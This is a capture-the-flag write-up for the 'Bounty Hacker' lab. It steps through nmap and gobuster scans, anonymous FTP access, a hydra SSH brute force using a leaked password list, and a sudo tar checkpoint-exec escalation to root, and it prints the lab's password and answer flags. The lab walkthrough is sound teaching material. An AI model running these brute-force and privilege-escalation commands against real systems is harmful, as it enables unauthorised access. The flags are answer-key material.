# Bounty Hacker

You were boasting on and on about your elite hacker skills in the bar and a few 
Bounty Hunters decided they'd take you up on claims! Prove your status is more 
than just a few glasses at the bar. I sense bell peppers & beef in your future! 

## Deploy and Scan

Using nmap to scan the machine and save the report

	nmap -sC -sV -oA scans/initial 10.10.47.74

We got 

FTP 21
SSH 22
HTTP 80

Checking out Homepage first

## Starting Gobuster

	gobuster dir --url http://10.10.47.74 -w /usr/share/seclists/Discovery/Web-Content/common.txt

Did not yield much so I ran dirbuster, which also didn't yield anything new.

## Checking out the FTP Server

The Server allows login as anonymous

	dir
	200 PORT command successful. Consider using PASV.
	150 Here comes the directory listing.
	-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
	-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
	226 Directory send OK.
	get locks.txt
	get task.txt

I download the files to inspect them on my machine which gives the Answer to the question by looking at task.txt

*Who wrote the task list?*
*lin*

In locks.txt I find a bunch of what seems to be passwords. 

The next Task is to brutefoce something useing these passowrds.

*What service can you bruteforce with the text file found?*
*ssh*

## Bruteforcing

A bit of googling "ssh brute force" lead me to try hydra out. The challange also hints to hydra.
The main problem at the moment seems to find a user name. So far we heard the names

- lin
- Vicous
- Red Eye

So I create users.txt file with those names to try together with locks.txt

	hydra -P locks.txt -L users.txt ssh://10.10.47.74

	[DATA] attacking ssh://10.10.47.74:22/
	[22][ssh] host: 10.10.47.74   login: lin   password: RedDr4gonSynd1cat3
	1 of 1 target successfully completed, 1 valid password found
	
*What is the users password?*
*RedDr4gonSynd1cat3*

this now lets us log in with ssh

	ssh lin@10.10.47.74

in the Home directory we find usr.txt

*user.txt*
*THM{CR1M3_SyNd1C4T3}*

## Escalating our privileges

### Enumeration

Going down the enumeration checklist https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

	find / -perm -u=s -type f 2>/dev/null

The only intresting thing here was chrome-sandbox and I did some research into that. There seems to be exploits
for this. But it seemed to far feched. I tried to focus on easer targets first so I checked

	lin@bountyhacker:~$ sudo -l
	[sudo] password for lin: 
	Matching Defaults entries for lin on bountyhacker:
	    env_reset, mail_badpass,
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User lin may run the following commands on bountyhacker:
	    (root) /bin/tar

Searching GTFObins I found

	sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

which instantly gets me root

	tar: Removing leading `/' from member names
	# whoami
	root
	locate root.tx        
	/root/root.txt
	# cat /root/root.txt
	THM{80UN7Y_h4cK3r}
 
*root.txt*
*THM{80UN7Y_h4cK3r}*

## Important Info

Target: 10.10.47.74
My IP: 10.9.222.124

usr: lin
pw RedDr4gonSynd1cat3

